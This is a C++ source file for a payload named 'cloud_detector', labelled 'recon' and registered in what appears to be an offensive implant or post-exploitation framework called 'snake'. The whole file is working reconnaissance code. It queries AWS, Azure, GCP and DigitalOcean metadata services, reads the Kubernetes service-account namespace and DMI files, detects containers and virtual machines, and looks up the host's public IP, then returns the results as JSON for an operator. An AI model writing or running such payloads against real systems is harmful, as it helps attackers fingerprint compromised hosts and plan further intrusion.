#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include <cctype>
#include <cstdlib>
#include <cstring>
#include <string>
#include <utility>
#include <vector>

#include "snake/net.hpp"
#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

std::string metadata_get(const std::string& url, const std::string& header_key,
                         const std::string& header_val) {
    Headers h;
    if (!header_key.empty()) h.emplace_back(header_key, header_val);
    HttpResponse r = http_get(url, h);
    if (!r.ok) return "";
    return trim(r.body);
}

bool check_dmi(const std::string& file, const std::string& vendor) {
    std::string data;
    if (!read_file("/sys/class/dmi/id/" + file, data)) return false;
    std::string low = data;
    for (char& c : low) c = (char)::tolower((unsigned char)c);
    return low.find(vendor) != std::string::npos;
}

bool detect_aws(OJ& metadata, OJ& features) {
    HttpResponse token_resp = http_request("PUT", "http://169.254.169.254/latest/api/token",
                                    {{"X-aws-ec2-metadata-token-ttl-seconds", "21600"}});
    std::string token = token_resp.ok ? trim(token_resp.body) : "";
    features["aws_imdsv2"] = !token.empty();

    Headers h;
    if (!token.empty()) h.emplace_back("X-aws-ec2-metadata-token", token);
    HttpResponse root = http_get("http://169.254.169.254/latest/meta-data/", h);
    if (!root.ok || root.status != 200) return false;

    const Headers fields = {
        {"instance-id", "instance-id"},
        {"instance-type", "instance-type"},
        {"ami-id", "ami-id"},
        {"region", "placement/availability-zone"},
        {"vpc-id", "network/interfaces/macs/0/vpc-id"},
        {"subnet-id", "network/interfaces/macs/0/subnet-id"},
    };
    for (const auto& f : fields) {
        std::string val = metadata_get("http://169.254.169.254/latest/meta-data/" + f.second,
                                       "X-aws-ec2-metadata-token", token);
        if (!val.empty()) metadata["aws_" + f.first] = val;
    }
    return true;
}

bool detect_azure(OJ& metadata) {
    std::string data = metadata_get(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata", "true");
    if (data.empty()) return check_dmi("sys_vendor", "microsoft");
    metadata["azure_raw"] = data;
    return true;
}

bool detect_gcp(OJ& metadata) {
    std::string data = metadata_get("http://metadata.google.internal/computeMetadata/v1/",
                                    "Metadata-Flavor", "Google");
    if (data.empty()) return check_dmi("product_name", "google");
    metadata["gcp_raw"] = data;

    const Headers eps = {
        {"instance/id", "gcp_instance_id"},
        {"instance/machine-type", "gcp_machine_type"},
        {"instance/zone", "gcp_zone"},
        {"project/project-id", "gcp_project_id"},
    };
    const std::string base = "http://metadata.google.internal/computeMetadata/v1/";
    for (const auto& ep : eps) {
        std::string val = metadata_get(base + ep.first, "Metadata-Flavor", "Google");
        if (!val.empty()) metadata[ep.second] = val;
    }
    return true;
}

bool detect_do(OJ& metadata) {
    std::string data = metadata_get("http://169.254.169.254/metadata/v1.json", "", "");
    if (!data.empty()) {
        metadata["digitalocean_raw"] = data;
        return true;
    }
    struct stat st;
    return stat("/etc/digitalocean", &st) == 0;
}

bool detect_docker(OJ& features) {
    struct stat st;
    if (stat("/.dockerenv", &st) == 0) {
        features["container"] = true;
        return true;
    }
    std::string data;
    if (read_file("/proc/1/cgroup", data) && data.find("docker") != std::string::npos) {
        features["container"] = true;
        return true;
    }
    return false;
}

bool detect_k8s(OJ& metadata, OJ& features) {
    struct stat st;
    if (stat("/var/run/secrets/kubernetes.io/serviceaccount", &st) == 0) {
        features["container"] = true;
        features["orchestrated"] = true;
        std::string ns;
        if (read_file("/var/run/secrets/kubernetes.io/serviceaccount/namespace", ns))
            metadata["k8s_namespace"] = trim(ns);
        return true;
    }
    const char* vars[] = {"KUBERNETES_SERVICE_HOST", "KUBERNETES_SERVICE_PORT"};
    for (const char* v : vars) {
        const char* val = getenv(v);
        if (val != nullptr && *val != '\0') {
            features["container"] = true;
            features["orchestrated"] = true;
            return true;
        }
    }
    return false;
}

void detect_vm(OJ& features) {
    const Headers ind = {
        {"/sys/class/dmi/id/product_name", "virtualbox"},
        {"/sys/class/dmi/id/product_name", "vmware"},
        {"/sys/class/dmi/id/product_name", "kvm"},
        {"/sys/class/dmi/id/product_name", "qemu"},
        {"/sys/class/dmi/id/product_name", "xen"},
        {"/sys/class/dmi/id/product_name", "hyper-v"},
        {"/sys/class/dmi/id/sys_vendor", "vmware"},
        {"/sys/class/dmi/id/sys_vendor", "microsoft"},
        {"/sys/class/dmi/id/bios_vendor", "xen"},
    };
    for (const auto& i : ind) {
        std::string data;
        if (!read_file(i.first, data)) continue;
        std::string low = data;
        for (char& c : low) c = (char)::tolower((unsigned char)c);
        if (low.find(i.second) != std::string::npos) {
            features["virtual_machine"] = true;
            return;
        }
    }
}

std::string get_public_ip() {
    HttpResponse r = http_get("https://api.ipify.org", {});
    if (r.ok && !trim(r.body).empty()) return trim(r.body);
    struct addrinfo hints;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = nullptr;
    if (getaddrinfo("myip.opendns.com", nullptr, &hints, &res) != 0 || res == nullptr) return "";
    char hostbuf[NI_MAXHOST] = {0};
    std::string out;
    if (getnameinfo(res->ai_addr, res->ai_addrlen, hostbuf, sizeof(hostbuf), nullptr, 0,
                    NI_NUMERICHOST) == 0)
        out = hostbuf;
    freeaddrinfo(res);
    return out;
}

class CloudDetector : public Payload {
  public:
    const char* name() const override { return "cloud_detector"; }
    const char* category() const override { return "recon"; }
    const char* description() const override {
        return "Detect cloud environment (AWS/Azure/GCP/DigitalOcean/Docker/K8s)";
    }

    Output execute(const Args&) const override {
        OJ metadata = OJ::object();
        OJ features = OJ::object();
        std::string provider;

        if (detect_aws(metadata, features)) provider = "aws";
        if (detect_azure(metadata)) provider = "azure";
        if (detect_gcp(metadata)) provider = "gcp";
        if (detect_do(metadata)) provider = "digitalocean";
        if (detect_docker(features)) provider = "docker";
        if (detect_k8s(metadata, features)) provider = "kubernetes";
        detect_vm(features);

        OJ r = OJ::object();
        r["provider"] = provider;
        r["metadata"] = metadata;
        r["features"] = features;
        r["is_cloud"] = !provider.empty();
        r["is_vm"] = features.contains("virtual_machine");
        r["hostname"] = hostname_now();
        std::string ip = get_public_ip();
        if (!ip.empty()) r["public_ip"] = ip;

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

CloudDetector g_cloud_detector;

struct Reg { Reg() { Register(&g_cloud_detector); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
